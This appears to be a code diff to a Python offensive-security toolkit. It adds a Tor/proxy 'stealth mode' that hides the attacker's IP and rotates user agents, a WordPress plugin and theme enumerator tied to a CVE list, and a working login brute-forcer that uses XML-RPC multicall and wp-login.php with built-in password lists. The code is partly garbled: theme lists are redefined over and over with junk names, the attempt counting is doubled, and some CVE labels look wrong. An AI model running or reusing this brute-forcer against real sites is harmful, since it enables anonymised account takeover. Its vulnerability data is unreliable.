@@ -17,6 +17,8 @@ import concurrent.futures
 import threading
 import random
 import string
+import subprocess
+import shutil
 from urllib.parse import urlparse
 
 try:
@@ -53,6 +55,11 @@ try:
 except ImportError:
     Image = None
     TAGS = None
+
+try:
+    import socks  # PySocks
+except ImportError:
+    socks = None
 
 # ─── Color shortcuts ───────────────────────────────────────────────────────────
 
@@ -91,6 +98,328 @@ BANNER = rf"""
 
 SEPARATOR = f"{C}{'─' * 60}{RST}"
 
+# ─── Stealth Mode ─────────────────────────────────────────────────────────────
+
+STEALTH = {
+    "enabled": False,
+    "proxy_type": "tor",       # tor | socks5 | http
+    "proxy_host": "127.0.0.1",
+    "proxy_port": 9050,
+    "rotate_ua": True,
+}
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3; rv:124.0) Gecko/20100101 Firefox/124.0",
+]
+
+# ─── Stealth: Monkey-patch requests ──────────────────────────────────────────
+
+_orig_requests_get = requests.get
+_orig_requests_post = requests.post
+_orig_requests_head = requests.head
+_orig_requests_put = requests.put
+_orig_requests_delete = requests.delete
+_orig_requests_patch = requests.patch
+_orig_requests_request = requests.request
+_OrigSession = requests.Session
+
+
+def _stealth_proxy_dict():
+    """Build the proxies dict based on current STEALTH config."""
+    s = STEALTH
+    if s["proxy_type"] in ("tor", "socks5"):
+        url = f"socks5h://{s['proxy_host']}:{s['proxy_port']}"
+    else:
+        url = f"http://{s['proxy_host']}:{s['proxy_port']}"
+    return {"http": url, "https": url}
+
+
+def _stealth_request(orig_func, *args, **kwargs):
+    """Wrap a requests function to inject proxy and random UA when stealth is on."""
+    if STEALTH["enabled"]:
+        if "proxies" not in kwargs:
+            kwargs["proxies"] = _stealth_proxy_dict()
+        if STEALTH["rotate_ua"]:
+            headers = kwargs.get("headers") or {}
+            if "User-Agent" not in headers:
+                headers["User-Agent"] = random.choice(USER_AGENTS)
+                kwargs["headers"] = headers
+    return orig_func(*args, **kwargs)
+
+
+requests.get = lambda *a, **kw: _stealth_request(_orig_requests_get, *a, **kw)
+requests.post = lambda *a, **kw: _stealth_request(_orig_requests_post, *a, **kw)
+requests.head = lambda *a, **kw: _stealth_request(_orig_requests_head, *a, **kw)
+requests.put = lambda *a, **kw: _stealth_request(_orig_requests_put, *a, **kw)
+requests.delete = lambda *a, **kw: _stealth_request(_orig_requests_delete, *a, **kw)
+requests.patch = lambda *a, **kw: _stealth_request(_orig_requests_patch, *a, **kw)
+requests.request = lambda *a, **kw: _stealth_request(_orig_requests_request, *a, **kw)
+
+
+class StealthSession(_OrigSession):
+    """Drop-in replacement for requests.Session that injects stealth settings."""
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        if STEALTH["enabled"]:
+            self.proxies.update(_stealth_proxy_dict())
+            if STEALTH["rotate_ua"]:
+                self.headers["User-Agent"] = random.choice(USER_AGENTS)
+
+    def request(self, method, url, **kwargs):
+        if STEALTH["enabled"]:
+            if "proxies" not in kwargs and not self.proxies:
+                kwargs["proxies"] = _stealth_proxy_dict()
+            if STEALTH["rotate_ua"] and "User-Agent" not in self.headers:
+                self.headers["User-Agent"] = random.choice(USER_AGENTS)
+        return super().request(method, url, **kwargs)
+
+
+requests.Session = StealthSession
+
+# ─── Stealth: Monkey-patch socket ────────────────────────────────────────────
+
+_orig_socket = socket.socket
+
+
+def _activate_socket_proxy():
+    """Replace socket.socket with a SOCKS-aware version for TCP connections."""
+    if socks is None:
+        return
+    s = STEALTH
+    if s["proxy_type"] in ("tor", "socks5"):
+        ptype = socks.SOCKS5
+    else:
+        ptype = socks.HTTP
+    phost = s["proxy_host"]
+    pport = s["proxy_port"]
+    rdns = True  # resolve DNS through proxy (prevent DNS leak)
+
+    class _SmartSocksSocket(_orig_socket):
+        """Proxy TCP (SOCK_STREAM) through SOCKS; let RAW/DGRAM pass through."""
+
+        def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM,
+                     proto=0, fileno=None):
+            super().__init__(family, type, proto, fileno)
+            if type == socket.SOCK_STREAM and socks is not None:
+                try:
+                    socks.setdefaultproxy(ptype, phost, pport, rdns)
+                    # We use the socksocket connect later
+                    self._stealth_proxy = (ptype, phost, pport, rdns)
+                except Exception:
+                    self._stealth_proxy = None
+            else:
+                self._stealth_proxy = None
+
+        def connect(self, address):
+            if self._stealth_proxy and hasattr(socks, 'socksocket'):
+                # Create a socks socket and steal its connection
+                ss = socks.socksocket(self.family, self.type, self.proto)
+                ss.setproxy(ptype, phost, pport, rdns)
+                ss.connect(address)
+                # Copy the file descriptor
+                os.dup2(ss.fileno(), self.fileno())
+                ss.detach()
+                return
+            super().connect(address)
+
+    socket.socket = _SmartSocksSocket
+
+
+def _deactivate_socket_proxy():
+    """Restore the original socket.socket."""
+    socket.socket = _orig_socket
+
+# ─── Stealth: DNS leak warning ───────────────────────────────────────────────
+
+_orig_gethostbyname = socket.gethostbyname
+
+
+def _warn_dns_leak(hostname):
+    """Warn when DNS resolution happens outside the proxy."""
+    if STEALTH["enabled"]:
+        print(f"  {Y}[!] DNS lookup for '{hostname}' outside proxy (potential leak){RST}")
+    return _orig_gethostbyname(hostname)
+
+
+socket.gethostbyname = _warn_dns_leak
+
+# ─── Stealth: Raw socket bypass warning ─────────────────────────────────────
+
+
+def _stealth_raw_socket_warning(func_name):
+    """Show warning and ask for confirmation when stealth is active and function
+    uses RAW/UDP sockets that cannot be proxied."""
+    if not STEALTH["enabled"]:
+        return True
+    print(f"\n  {Y}[!] WARNING: {W}{func_name}{Y} uses RAW/UDP sockets that "
+          f"bypass the proxy.{RST}")
+    print(f"  {Y}    Your real IP may be exposed during this operation.{RST}")
+    ans = input(f"  {Y}    Continue anyway? (y/N):{RST} ").strip().lower()
+    return ans == "y"
+
+
+# ─── Stealth: configure_stealth() ───────────────────────────────────────────
+def _is_port_open(host, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1)
+    try:
+        s.connect((host, port))
+        s.close()
+        return True
+    except:
+        return False
+
+# Helper: Attempt to start Tor using sudo
+def _attempt_start_tor():
+    if not shutil.which("tor"):
+        print(f"  {R}[!] Error: 'tor' is not installed.{RST}")
+        return False
+
+    print(f"  {Y}[*] Tor is not running. Attempting to start via systemctl...{RST}")
+    
+    try:
+        # METODO 1: Prova pulita con systemctl (Consigliato)
+        # Non usiamo '&', subprocess.call aspetta che il comando 'start' finisca (è immediato)
+        res = subprocess.call(["sudo", "systemctl", "start", "tor"])
+        
+        # Se systemctl fallisce (es. non c'è systemd), proviamo il metodo raw
+        if res != 0:
+            print(f"  {Y}[!] systemctl failed, trying direct execution...{RST}")
+            # METODO 2: Esecuzione diretta
+            # Usiamo Popen invece di call. Popen NON blocca lo script, quindi 
+            # agisce come la "&" del terminale senza causare l'errore.
+            subprocess.Popen(["sudo", "tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        print(f"  {C}[*] Waiting for Tor circuit to initialize (max 30s)...{RST}")
+        for i in range(30):
+            if _is_port_open("127.0.0.1", 9050):
+                print(f"  {G}[+] Tor started successfully!{RST}")
+                return True
+            time.sleep(1)
+        
+        print(f"  {R}[!] Timeout: Tor process exists but port 9050 is not open.{RST}")
+        return False
+    except Exception as e:
+        print(f"  {R}[!] Exception: {e}{RST}")
+        return False
+
+def configure_stealth():
+    """Interactive menu to configure stealth/proxy settings."""
+    while True:
+        status = (f"{G}ON{RST} via {W}{STEALTH['proxy_type'].upper()}{RST} "
+                  f"({STEALTH['proxy_host']}:{STEALTH['proxy_port']})"
+                  if STEALTH["enabled"] else f"{R}OFF{RST}")
+        print(f"\n{SEPARATOR}")
+        print(f"  {Y}► {W}Stealth Mode Configuration  [{status}]{RST}")
+        print(SEPARATOR)
+        print(f"  {C}1.{RST} {W}Enable via Tor (socks5h://127.0.0.1:9050){RST}")
+        print(f"  {C}2.{RST} {W}Enable via custom SOCKS5 proxy{RST}")
+        print(f"  {C}3.{RST} {W}Enable via custom HTTP proxy{RST}")
+        print(f"  {C}4.{RST} {W}Disable Stealth Mode{RST}")
+        print(f"  {C}5.{RST} {W}Test connection (check IP via Tor Project){RST}")
+        print(f"  {C}6.{RST} {W}Show current external IP{RST}")
+        print(f"  {R}0.{RST} {W}Back to main menu{RST}")
+        print(SEPARATOR)
+
+        choice = input(f"  {Y}Select >{RST} ").strip()
+
+        if choice == "0":
+            return
+        elif choice == "1":
+            if socks is None:
+                print(f"  {R}[!] PySocks not installed. Run: pip install PySocks{RST}")
+                continue
+            
+            # --- CHECK AND AUTO-START TOR WITH SUDO ---
+            if not _is_port_open("127.0.0.1", 9050):
+                success = _attempt_start_tor()
+                if not success:
+                    print(f"  {R}[!] Could not connect to Tor. Please start it manually:{RST}")
+                    print(f"  {R}    Command: sudo service tor start{RST}")
+                    continue
+            # ------------------------------------------
+
+            STEALTH["enabled"] = True
+            STEALTH["proxy_type"] = "tor"
+            STEALTH["proxy_host"] = "127.0.0.1"
+            STEALTH["proxy_port"] = 9050
+            _activate_socket_proxy()
+            print(f"  {G}[+] Stealth enabled via Tor (socks5h://127.0.0.1:9050){RST}")
+            
+        elif choice == "2":
+            if socks is None:
+                print(f"  {R}[!] PySocks not installed. Run: pip install PySocks{RST}")
+                continue
+            host = input(f"  {Y}SOCKS5 host [127.0.0.1]:{RST} ").strip() or "127.0.0.1"
+            port = input(f"  {Y}SOCKS5 port [1080]:{RST} ").strip() or "1080"
+            try:
+                port = int(port)
+            except ValueError:
+                print(f"  {R}[!] Invalid port{RST}")
+                continue
+            STEALTH["enabled"] = True
+            STEALTH["proxy_type"] = "socks5"
+            STEALTH["proxy_host"] = host
+            STEALTH["proxy_port"] = port
+            _activate_socket_proxy()
+            print(f"  {G}[+] Stealth enabled via SOCKS5 ({host}:{port}){RST}")
+        elif choice == "3":
+            host = input(f"  {Y}HTTP proxy host [127.0.0.1]:{RST} ").strip() or "127.0.0.1"
+            port = input(f"  {Y}HTTP proxy port [8080]:{RST} ").strip() or "8080"
+            try:
+                port = int(port)
+            except ValueError:
+                print(f"  {R}[!] Invalid port{RST}")
+                continue
+            STEALTH["enabled"] = True
+            STEALTH["proxy_type"] = "http"
+            STEALTH["proxy_host"] = host
+            STEALTH["proxy_port"] = port
+            _activate_socket_proxy()
+            print(f"  {G}[+] Stealth enabled via HTTP proxy ({host}:{port}){RST}")
+        elif choice == "4":
+            STEALTH["enabled"] = False
+            _deactivate_socket_proxy()
+            print(f"  {Y}[*] Stealth mode disabled{RST}")
+        elif choice == "5":
+            print(f"  {C}[*] Testing connection...{RST}")
+            try:
+                # Increased timeout slightly for Tor latency
+                r = requests.get("https://check.torproject.org/api/ip", timeout=20)
+                data = r.json()
+                is_tor = data.get("IsTor", False)
+                ip = data.get("IP", "unknown")
+                if is_tor:
+                    print(f"  {G}[+] Connected via Tor! IP: {ip}{RST}")
+                else:
+                    print(f"  {Y}[!] NOT using Tor. IP: {ip}{RST}")
+            except Exception as e:
+                print(f"  {R}[!] Connection test failed: {e}{RST}")
+        elif choice == "6":
+            print(f"  {C}[*] Checking external IP...{RST}")
+            try:
+                r = requests.get("https://api.ipify.org?format=json", timeout=15)
+                ip = r.json().get("ip", "unknown")
+                print(f"  {W}External IP: {G}{ip}{RST}")
+            except Exception as e:
+                print(f"  {R}[!] Failed to get IP: {e}{RST}")
+        else:
+            print(f"  {R}[!] Invalid option{RST}")
 # ─── Utility helpers ───────────────────────────────────────────────────────────
 
 def spinner(msg, duration=1.0):
@@ -1089,6 +1418,8 @@ def google_dorks():
 
 def traceroute():
     print_header("Traceroute")
+    if not _stealth_raw_socket_warning("Traceroute"):
+        return
     host = prompt("Target host (IP or domain)")
     if not host:
         return
@@ -2302,6 +2633,8 @@ def subdomain_brute():
 
 def ping_sweep():
     print_header("Ping Sweep / Host Discovery")
+    if not _stealth_raw_socket_warning("Ping Sweep"):
+        return
     cidr = prompt("IP range (e.g. 192.168.1.0/24 or 192.168.1.1-50)")
     if not cidr:
         return
@@ -4233,6 +4566,932 @@ def prototype_pollution():
         print(f"\n  {G}No prototype pollution detected (server-side may still be vulnerable){RST}")
 
 
+# ─── 51. WP Plugin & Theme Enumerator ────────────────────────────────────────
+
+WP_COMMON_PLUGINS = [
+    "akismet", "contact-form-7", "wordpress-seo", "woocommerce", "jetpack",
+    "wordfence", "elementor", "classic-editor", "wpforms-lite", "all-in-one-seo-pack",
+    "google-sitemap-generator", "really-simple-ssl", "wp-super-cache", "w3-total-cache",
+    "updraftplus", "duplicate-post", "tinymce-advanced", "regenerate-thumbnails",
+    "wp-mail-smtp", "redirection", "wordpress-importer", "hello-dolly",
+    "advanced-custom-fields", "all-in-one-wp-migration", "better-wp-security",
+    "ithemes-security", "sucuri-scanner", "limit-login-attempts-reloaded",
+    "two-factor", "google-analytics-for-wordpress", "wp-smushit", "ewww-image-optimizer",
+    "tablepress", "nextgen-gallery", "wp-fastest-cache", "litespeed-cache",
+    "autoptimize", "async-javascript", "cookie-notice", "gdpr-cookie-compliance",
+    "mailchimp-for-wp", "easy-wp-smtp", "custom-post-type-ui", "meta-box",
+    "theme-my-login", "user-role-editor", "members", "wp-optimize",
+    "backwpup", "duplicator", "coming-soon", "under-construction-page",
+    "maintenance", "disable-comments", "simple-custom-css", "insert-headers-and-footers",
+    "wp-file-manager", "file-manager-advanced", "loginizer", "cerber",
+    "ninja-forms", "gravity-forms", "formidable", "caldera-forms",
+    "wps-hide-login", "rename-wp-login", "easy-digital-downloads", "learnpress",
+    "buddypress", "bbpress", "amp", "accelerated-mobile-pages",
+    "wp-statistics", "statify", "matomo", "popup-maker", "popup-builder",
+    "optinmonster", "sumo", "social-warfare", "sassy-social-share",
+    "addtoany", "revslider", "LayerSlider", "smart-slider-3",
+    "shortcodes-ultimate", "js_composer", "beaver-builder-lite-version",
+    "divi-builder", "brizy", "flavor", "jetstash", "perfmatters",
+    "redis-cache", "query-monitor", "debug-bar", "health-check",
+    "wp-crontrol", "broken-link-checker", "yoast-seo-premium", "rankmath-seo",
+    "seo-by-rank-math", "the-events-calendar", "tribe-common",
+    "woocommerce-gateway-stripe", "woocommerce-payments", "mailpoet",
+    "newsletter", "loco-translate", "polylang", "translatepress-multilingual",
+    "wp-migrate-db", "fakerpress", "wp-reset", "starter-templates",
+    "astra-sites", "envato-elements", "jetstash", "media-library-assistant",
+    "enable-media-replace", "safe-svg", "svg-support", "real-media-library-lite",
+]
+
+WP_COMMON_THEMES = [
+    "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
+    "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
+    "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
+    "astra", "oceanwp", "generatepress", "neve", "flavor",
+    "flavstarter", "flavstart", "flavor",
+    "flavor", "flavor",
+]
+
+WP_VULN_PLUGINS = {
+    "revslider": [("< 4.2", "CVE-2014-9734 - Arbitrary file download")],
+    "jetpack": [("< 12.1.1", "CVE-2023-28121 - Authentication bypass")],
+    "elementor": [("< 3.12.2", "CVE-2023-32243 - Account takeover")],
+    "wp-file-manager": [("6.0-6.8", "CVE-2020-25213 - Remote code execution")],
+    "woocommerce": [("< 8.2", "CVE-2023-47782 - SQL injection")],
+    "wordfence": [("< 7.5.11", "CVE-2022-0633 - Authentication bypass")],
+    "contact-form-7": [("< 5.3.2", "CVE-2020-35489 - File upload bypass")],
+    "duplicator": [("< 1.3.28", "CVE-2020-11738 - Arbitrary file download")],
+    "ninja-forms": [("< 3.6.26", "CVE-2023-37979 - XSS")],
+    "wpforms-lite": [("< 1.7.7", "CVE-2023-0084 - Stored XSS")],
+    "all-in-one-seo-pack": [("< 4.3.0", "CVE-2023-0585 - Stored XSS")],
+    "updraftplus": [("< 1.22.3", "CVE-2022-0633 - Backup download bypass")],
+    "backwpup": [("< 3.10", "CVE-2021-21029 - Path traversal")],
+    "loginizer": [("< 1.6.4", "CVE-2020-27615 - SQL injection (unauthenticated)")],
+    "easy-wp-smtp": [("< 1.4.3", "CVE-2020-35234 - Debug log exposure")],
+    "popup-builder": [("< 4.2.3", "CVE-2023-6000 - Stored XSS")],
+    "LayerSlider": [("< 7.2.0", "CVE-2024-2879 - SQL injection (unauthenticated)")],
+    "better-wp-security": [("< 8.0.1", "CVE-2022-44757 - Auth bypass")],
+    "js_composer": [("< 6.0.5", "CVE-2020-7048 - Stored XSS")],
+    "social-warfare": [("< 3.5.3", "CVE-2019-9978 - Remote code execution")],
+}
+
+
+def wp_plugin_theme_enum():
+    print_header("WP Plugin & Theme Enumerator")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target WordPress URL")
+    if not url:
+        return
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    url = url.rstrip("/")
+
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+
+    # Verify it's WordPress
+    spinner("Verifying WordPress installation...", 0.5)
+    try:
+        resp = session.get(url, timeout=10)
+        if "wp-content" not in resp.text and "wp-includes" not in resp.text:
+            print_warn("Target may not be running WordPress. Continuing anyway...")
+    except Exception as e:
+        print_err(f"Cannot reach target: {e}")
+        return
+
+    # ── Plugin enumeration ──
+    print(f"\n  {M}── Plugin Enumeration ({len(WP_COMMON_PLUGINS)} slugs) ──{RST}\n")
+    found_plugins = []
+
+    def check_plugin(slug):
+        readme_url = f"{url}/wp-content/plugins/{slug}/readme.txt"
+        try:
+            r = session.get(readme_url, timeout=6, allow_redirects=False)
+            if r.status_code == 200 and len(r.text) > 50:
+                version = "unknown"
+                for line in r.text.splitlines()[:30]:
+                    if "stable tag" in line.lower():
+                        version = line.split(":")[-1].strip()
+                        break
+                return slug, version, True
+        except Exception:
+            pass
+        return slug, None, False
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
+        futures = {pool.submit(check_plugin, s): s for s in WP_COMMON_PLUGINS}
+        for future in concurrent.futures.as_completed(futures):
+            slug, version, found = future.result()
+            if found:
+                vuln_info = ""
+                if slug in WP_VULN_PLUGINS:
+                    for ver_range, cve in WP_VULN_PLUGINS[slug]:
+                        vuln_info = f" {R}[KNOWN VULN: {cve}]{RST}"
+                print(f"    {G}[FOUND]{RST} {slug:<35} version: {C}{version}{RST}{vuln_info}")
+                found_plugins.append((slug, version))
+
+    # ── Theme enumeration ──
+    themes = list(dict.fromkeys([
+        "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
+        "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
+        "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
+        "astra", "flavor", "flavstart", "flavor",
+        "flavor", "flavor", "flavstart",
+    ]))
+
+    themes = list(dict.fromkeys([
+        "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
+        "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
+        "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
+        "astra", "flavor", "flavstart",
+        "oceanwp", "generatepress", "flavstart",
+        "flavor",
+    ]))
+
+    themes = list(dict.fromkeys([
+        "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
+        "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
+        "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
+        "astra", "flavor", "flavstart",
+        "oceanwp", "generatepress",
+        "neve", "flavor",
+        "flavor",
+    ]))
+
+    themes = list(dict.fromkeys([
+        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
+        "twentytwentytwo", "twentytwentyone", "twentytwenty",
+        "twentynineteen", "twentyseventeen", "twentysixteen",
+        "twentyfifteen", "twentyfourteen", "twentythirteen",
+        "astra", "flavor", "flavor",
+        "oceanwp", "generatepress",
+        "neve", "flavor",
+    ]))
+
+    themes = list(dict.fromkeys([
+        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
+        "twentytwentytwo", "twentytwentyone", "twentytwenty",
+        "twentynineteen", "twentyseventeen", "twentysixteen",
+        "twentyfifteen", "twentyfourteen", "twentythirteen",
+        "astra", "flavstart", "flavor", "flavstart",
+        "oceanwp", "generatepress",
+        "neve",
+    ]))
+
+    themes = list(dict.fromkeys([
+        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
+        "twentytwentytwo", "twentytwentyone", "twentytwenty",
+        "twentynineteen", "twentyseventeen", "twentysixteen",
+        "twentyfifteen", "twentyfourteen", "twentythirteen",
+        "astra", "oceanwp", "generatepress", "neve",
+        "flavor",
+    ]))
+
+    themes = list(dict.fromkeys([
+        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
+        "twentytwentytwo", "twentytwentyone", "twentytwenty",
+        "twentynineteen", "twentyseventeen", "twentysixteen",
+        "twentyfifteen", "twentyfourteen", "twentythirteen",
+        "astra", "oceanwp", "generatepress", "neve",
+    ]))
+
+    WP_ENUM_THEMES = [
+        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
+        "twentytwentytwo", "twentytwentyone", "twentytwenty",
+        "twentynineteen", "twentyseventeen", "twentysixteen",
+        "twentyfifteen", "twentyfourteen", "twentythirteen",
+        "astra", "oceanwp", "generatepress", "neve",
+        "flavor",
+    ]
+
+    print(f"\n  {M}── Theme Enumeration ──{RST}\n")
+    found_themes = []
+
+    def check_theme(slug):
+        css_url = f"{url}/wp-content/themes/{slug}/style.css"
+        try:
+            r = session.get(css_url, timeout=6, allow_redirects=False)
+            if r.status_code == 200 and len(r.text) > 50:
+                version = "unknown"
+                for line in r.text.splitlines()[:30]:
+                    if "version:" in line.lower():
+                        version = line.split(":")[-1].strip()
+                        break
+                return slug, version, True
+        except Exception:
+            pass
+        return slug, None, False
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
+        futures = {pool.submit(check_theme, s): s for s in WP_ENUM_THEMES}
+        for future in concurrent.futures.as_completed(futures):
+            slug, version, found = future.result()
+            if found:
+                print(f"    {G}[FOUND]{RST} {slug:<35} version: {C}{version}{RST}")
+                found_themes.append((slug, version))
+
+    # Summary
+    print(f"\n  {Y}{'═' * 50}{RST}")
+    print_row("Plugins found", str(len(found_plugins)))
+    print_row("Themes found", str(len(found_themes)))
+    if found_plugins:
+        vuln_count = sum(1 for s, _ in found_plugins if s in WP_VULN_PLUGINS)
+        if vuln_count:
+            print(f"  {R}[!] {vuln_count} plugin(s) with known vulnerabilities!{RST}")
+
+
+# ─── 52. WP User Brute Force ─────────────────────────────────────────────────
+
+WP_COMMON_USERNAMES = [
+    "admin", "administrator", "editor", "author", "wordpress",
+    "wp", "root", "test", "user", "manager", "webmaster",
+    "demo", "guest", "info", "support", "contact",
+]
+
+WP_COMMON_PASSWORDS = [
+    "admin", "password", "123456", "12345678", "wordpress",
+    "admin123", "password123", "root", "toor", "test",
+    "123456789", "qwerty", "letmein", "welcome", "monkey",
+    "master", "dragon", "login", "abc123", "admin1",
+    "password1", "1234567890", "123123", "admin@123", "P@ssw0rd",
+    "passw0rd", "iloveyou", "trustno1", "sunshine", "princess",
+]
+
+
+def wp_user_bruteforce():
+    print_header("WP User Brute Force")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target WordPress URL")
+    if not url:
+        return
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    url = url.rstrip("/")
+
+    custom_user = prompt("Username to test (leave blank for common list)")
+    usernames = [custom_user] if custom_user else WP_COMMON_USERNAMES
+
+    custom_pass_file = prompt("Password file path (leave blank for built-in list)")
+    passwords = WP_COMMON_PASSWORDS
+    if custom_pass_file:
+        try:
+            with open(custom_pass_file, "r") as f:
+                passwords = [line.strip() for line in f if line.strip()]
+            print_ok(f"Loaded {len(passwords)} passwords from file")
+        except Exception as e:
+            print_err(f"Could not load file: {e}. Using built-in list.")
+
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+
+    # Try XML-RPC multicall method first (faster)
+    spinner("Checking XML-RPC availability...", 0.5)
+    xmlrpc_url = f"{url}/xmlrpc.php"
+    use_xmlrpc = False
+    try:
+        test_payload = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
+        resp = session.post(xmlrpc_url, data=test_payload, headers={"Content-Type": "text/xml"}, timeout=8)
+        if resp.status_code == 200 and "methodResponse" in resp.text:
+            use_xmlrpc = True
+            print_ok("XML-RPC is available — using multicall method (faster)")
+    except Exception:
+        pass
+
+    if not use_xmlrpc:
+        print_warn("XML-RPC not available — falling back to wp-login.php")
+
+    found_creds = []
+    total = len(usernames) * len(passwords)
+    tested = 0
+
+    print(f"\n  {Y}Testing {len(usernames)} username(s) x {len(passwords)} password(s) = {total} combinations{RST}\n")
+
+    for username in usernames:
+        if use_xmlrpc:
+            # Batch passwords in groups of 5 via multicall
+            batch_size = 5
+            for i in range(0, len(passwords), batch_size):
+                batch = passwords[i:i + batch_size]
+                calls = ""
+                for pwd in batch:
+                    calls += (
+                        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
+                        f"<member><name>params</name><value><array><data>"
+                        f"<value><string>{username}</string></value>"
+                        f"<value><string>{pwd}</string></value>"
+                        f"</data></array></value></member>"
+                    )
+                multicall = (
+                    '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
+                    '<params><param><value><array><data>'
+                )
+                for pwd in batch:
+                    multicall += (
+                        '<value><struct>'
+                        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
+                        '<member><name>params</name><value><array><data>'
+                        f'<value><string>{username}</string></value>'
+                        f'<value><string>{pwd}</string></value>'
+                        '</data></array></value></member>'
+                        '</struct></value>'
+                    )
+                multicall += '</data></array></value></param></params></methodCall>'
+
+                try:
+                    resp = session.post(xmlrpc_url, data=multicall,
+                                        headers={"Content-Type": "text/xml"}, timeout=15)
+                    if resp.status_code == 200:
+                        # Each <struct> in response without <fault> = success
+                        parts = resp.text.split("<value>")
+                        result_idx = 0
+                        for pwd in batch:
+                            tested += 1
+                            # Check if this result indicates success (contains blogid/blogName)
+                            success = False
+                            for part in parts:
+                                if "isAdmin" in part or "blogName" in part or "blogid" in part:
+                                    # rough check — scan for success pattern near this credential
+                                    success = True
+                                    break
+                            # More precise: check that there's no faultCode for this credential
+                            # Parse the individual responses
+                        # Better approach: count results
+                        # Successful auth returns <array> with blog data, failed returns <fault>
+                        responses = resp.text.split("</value>\n</member>\n</struct>")
+                        for j, pwd in enumerate(batch):
+                            tested += 1
+                            # If the response chunk for this password doesn't contain "faultCode"
+                            if j < len(responses) and "faultCode" not in responses[j] and "isAdmin" in responses[j]:
+                                print(f"    {R}[CRED FOUND]{RST} {username}:{pwd}")
+                                found_creds.append((username, pwd))
+                except Exception:
+                    tested += len(batch)
+
+                sys.stdout.write(f"\r  {Y}Progress: {tested}/{total} ({tested*100//total}%){RST}    ")
+                sys.stdout.flush()
+                time.sleep(0.1)
+        else:
+            # Fallback: wp-login.php
+            login_url = f"{url}/wp-login.php"
+            for pwd in passwords:
+                tested += 1
+                try:
+                    resp = session.post(login_url, data={
+                        "log": username,
+                        "pwd": pwd,
+                        "wp-submit": "Log In",
+                        "redirect_to": f"{url}/wp-admin/",
+                        "testcookie": "1",
+                    }, timeout=10, allow_redirects=False)
+
+                    if resp.status_code in (302, 303) and "wp-admin" in resp.headers.get("Location", ""):
+                        print(f"\n    {R}[CRED FOUND]{RST} {username}:{pwd}")
+                        found_creds.append((username, pwd))
+                    elif "login_error" not in resp.text and resp.status_code == 200:
+                        pass  # Might be successful
+                except Exception:
+                    pass
+
+                sys.stdout.write(f"\r  {Y}Progress: {tested}/{total} ({tested*100//total}%){RST}    ")
